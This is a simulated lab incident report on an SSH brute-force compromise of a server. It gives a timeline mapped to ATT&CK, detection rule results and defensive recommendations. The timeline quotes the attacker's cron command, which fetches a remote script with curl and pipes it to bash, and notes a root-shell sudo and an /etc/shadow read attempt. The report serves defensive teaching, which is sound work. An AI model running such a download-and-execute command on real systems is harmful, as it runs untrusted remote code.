# Incident Investigation Report: SSH Brute Force with Account Compromise

| | |
|---|---|
| **Report ID** | INC-2026-001 |
| **Date of activity** | 19 Nov 2026 |
| **Host** | `ubuntu-srv` (10.0.0.5) |
| **Analyst** | sorif biswas |
| **Severity** | **High** |
| **Status** | Contained (simulated lab exercise) |
| **Data sources** | `logs/sample_auth.log`, `logs/sample_syslog.log` |

> This is a simulated investigation using sample data. IPs come from documentation ranges
> (RFC 5737) and are not real.

## 1. Executive summary

An external IP address (`203.0.113.45`) scanned the server, brute-forced SSH, and gained access as
the `deploy` user after 12 failed attempts. Within three minutes the attacker obtained a root shell,
created a new privileged account (`support`), and used it to schedule a download-and-execute
command. The `deploy` account and host should be treated as **compromised**.

## 2. Detection

The activity was flagged by the Python analyzer and detection rules:

```
python3 python/failed_login_analyzer.py logs/sample_auth.log
```

| Rule | Result |
|---|---|
| DR-001 SSH Brute Force | `203.0.113.45` – 12 failures |
| DR-002 Invalid Users | admin, test, oracle, ubuntu, postgres |
| DR-003 Success After Failures | `deploy` from `203.0.113.45` (**HIGH**) |
| DR-004 / DR-005 | `support` created and added to `sudo` |
| DR-006 | Root shell via `sudo /bin/bash` |
| DR-008 | `curl ... \| bash` in `support` cron job |

## 3. Timeline (server time, 19 Nov)

| Time | Source | Event | ATT&CK |
|---|---|---|---|
| 14:21:58–14:22:00 | syslog | UFW blocks `203.0.113.45` on ports 3389, 23, 3306 | T1595 Active Scanning |
| 14:22:10–14:22:49 | auth.log | Attempts for invalid users `admin`, `test`, `oracle`, `ubuntu`, `postgres` | T1110.003 |
| 14:22:30–14:22:44 | auth.log | 5 failed logins for `root`; `MaxAuthTries` exceeded | T1110.001 |
| 14:22:52–14:22:55 | auth.log | 2 failed logins for `deploy` | T1110.001 |
| **14:22:58** | auth.log | **`Accepted password` for `deploy` from `203.0.113.45`** | T1078 |
| 14:23:41 | auth.log | `deploy` runs `sudo /bin/bash` (root shell) | T1548.003 |
| 14:24:05 | auth.log | New user `support` (UID 1003) created | T1136.001 |
| 14:24:12 | auth.log | Password set for `support` | T1098 |
| 14:24:30 | auth.log | `support` added to `sudo` group | T1098 |
| 14:25:02 | auth.log | `deploy` session closed | – |
| 14:26:10 | syslog | `support` cron job runs `curl -s http://198.51.100.99/update.sh \| bash` | T1105 |
| 14:27:33 | syslog | Session started for `support` | T1078 |
| 14:31:02–14:31:05 | syslog | `ssh.service` fails and restarts | – (investigate) |

## 4. Key findings

1. **Credential attack succeeded.** `deploy` had a guessable password and password SSH login was enabled.
2. **No lockout or rate limiting** stopped 12 attempts in about 50 seconds.
3. **Privilege escalation was trivial.** `deploy` could run `sudo /bin/bash` without restriction.
4. **Persistence established.** Backdoor account `support` with sudo rights.
5. **Second-stage payload.** Remote script fetched and executed from `198.51.100.99`.
6. **Unexplained SSH restart** at 14:31 may indicate configuration tampering.

## 5. Other observations (lower priority)

| Event | Assessment |
|---|---|
| `bob` failed once, then succeeded from `192.168.1.35` | Likely benign typo (internal IP) |
| `198.51.100.23` – 3 failures for `guest`, `pi` | Low-volume scan, no success; monitor/block |
| `bob` failed `sudo cat /etc/shadow` at 16:30 | **Needs follow-up**: was this authorized? |
| Java process OOM-killed at 17:45 | Unrelated resource issue; may be coincidental |

## 6. Impact assessment

- **Confidentiality:** root access obtained; assume all data and credentials on the host exposed.
- **Integrity:** new account, cron job, and possible SSH config changes.
- **Availability:** no confirmed impact.

## 7. Recommendations

**Immediate (contain)**
- Block `203.0.113.45` and `198.51.100.99` at the firewall.
- Disable `deploy` and delete `support`; remove its cron job and home directory after preserving evidence.
- Reset credentials and rotate any secrets stored on the host.
- Capture a disk/memory image before remediation.

**Investigate**
- Download and analyze `update.sh` in a sandbox (do not execute on production).
- Review `/etc/ssh/sshd_config`, `authorized_keys`, crontabs, and `/etc/sudoers.d/`.
- Check for lateral movement from `ubuntu-srv` and look for the same IPs in other logs.
- Interview `bob` about the `/etc/shadow` attempt.

**Prevent**
- Disable SSH password authentication; require keys.
- Disable direct root login (`PermitRootLogin no`).
- Install `fail2ban` or equivalent; add MFA for SSH.
- Restrict sudo rights; alert on new users and group changes.
- Forward logs to a central SIEM.

## 8. Lessons learned

A single failed login is noise, but correlating firewall blocks, a burst of failures, a success from the
same IP, and account-creation events reveals the full attack chain. Alerting on *success after failures*
would have caught this about 3 minutes before persistence was established.
